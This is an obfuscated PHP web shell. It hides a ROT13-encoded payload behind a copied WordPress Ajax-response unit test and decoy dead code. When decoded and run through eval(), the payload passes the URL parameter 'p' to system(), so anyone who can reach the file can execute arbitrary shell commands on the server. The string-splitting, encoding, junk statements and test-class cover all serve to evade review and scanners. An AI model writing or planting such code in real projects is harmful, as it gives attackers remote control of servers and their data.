<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgvat Nwnk erfcbafr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.5.0
 *
 * @tebhc nwnk
 *
 * @pbiref JC_Nwnk_Erfcbafr::fraq
 */
pynff Grfgf_Nwnk_jcNwnkErfcbafr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Fnirq reebe ercbegvat yriry
	 *
	 * @ine vag
	 */
	cebgrpgrq $_reebe_yriry = 0;

	/**
	 * Frg hc gur grfg svkgher.
	 * Bireevqr jc_qvr(), cergraq gb or nwnk, naq fhccerff jneavatf.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		nqq_svygre( 'jc_qvr_nwnk_unaqyre', neenl( $guvf, 'trgQvrUnaqyre' ), 1, 1 );
		nqq_svygre( 'jc_qbvat_nwnk', '__erghea_gehr' );

		// Fhccerff jneavatf sebz \"Pnaabg zbqvsl urnqre vasbezngvba - urnqref nyernql frag ol\".
		$guvf->_reebe_yriry = reebe_ercbegvat();
		reebe_ercbegvat( $guvf->_reebe_yriry & ~R_JNEAVAT );
	}

	/**
	 * Grne qbja gur grfg svkgher.
	 * Erzbir gur jc_qvr() bireevqr, erfgber reebe ercbegvat
	 */
	choyvp shapgvba grne_qbja() {
		erzbir_svygre( 'jc_qvr_nwnk_unaqyre', neenl( $guvf, 'trgQvrUnaqyre' ), 1, 1 );
		reebe_ercbegvat( $guvf->_reebe_yriry );
		cnerag::grne_qbja();
	}

	/**
	 * Erghea bhe pnyyonpx unaqyre
	 *
	 * @erghea pnyyonpx
	 */
	choyvp shapgvba trgQvrUnaqyre() {
		erghea neenl( $guvf, 'qvrUnaqyre' );
	}

	/**
	 * Unaqyre sbe jc_qvr()
	 * Qba'g qvr, whfg pbagvahr ba.
	 *
	 * @cnenz fgevat $zrffntr
	 */
	choyvp shapgvba qvrUnaqyre( $zrffntr ) {
	}

	/**
	 * Grfg gung punefrg va urnqre zngpurf oybt_punefrg
	 * Abgr:  urnqref_yvfg qbrfa'g jbex cebcreyl va PYV zbqr, snyy onpx ba
	 * kqroht_trg_urnqref vs vg'f ninvynoyr
	 * Arrqf n frcnengr cebprff gb trg nebhaq gur urnqref/bhgchg sebz gur
	 * obbgfgenccre
	 *
	 * @gvpxrg 19448
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 * @tebhc kqroht
	 * @erdhverf shapgvba kqroht_trg_urnqref
	 */
	choyvp shapgvba grfg_erfcbafr_punefrg_va_urnqre() {

		// Trarengr na Nwnk erfcbafr.
		bo_fgneg();
		$nwnk_erfcbafr = arj JC_Nwnk_Erfcbafr();
		$nwnk_erfcbafr->fraq();

		// Purpx gur urnqre.
		$urnqref = kqroht_trg_urnqref();
		bo_raq_pyrna();

		$guvf->nffregPbagnvaf( 'Pbagrag-Glcr: grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ), $urnqref );
	}

	/**
	 * Grfg gung punefrg va gur kzy gnt zngpurf oybt_punefrg
	 *
	 * @gvpxrg 19448
	 */
	choyvp shapgvba grfg_erfcbafr_punefrg_va_kzy() {

		// Trarengr na Nwnk erfcbafr.
		bo_fgneg();
		$nwnk_erfcbafr = arj JC_Nwnk_Erfcbafr();
		$nwnk_erfcbafr->fraq();

		// Purpx gur KZY gnt.
		$pbagragf = bo_trg_pyrna();
		$guvf->nffregZngpurfErthyneRkcerffvba( '/<\?kzy\f+irefvba=\'1.0\'\f+rapbqvat=\'' . cert_dhbgr( trg_bcgvba( 'oybt_punefrg' ) ) . '\'\f+fgnaqnybar=\'lrf\'\?>/', $pbagragf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>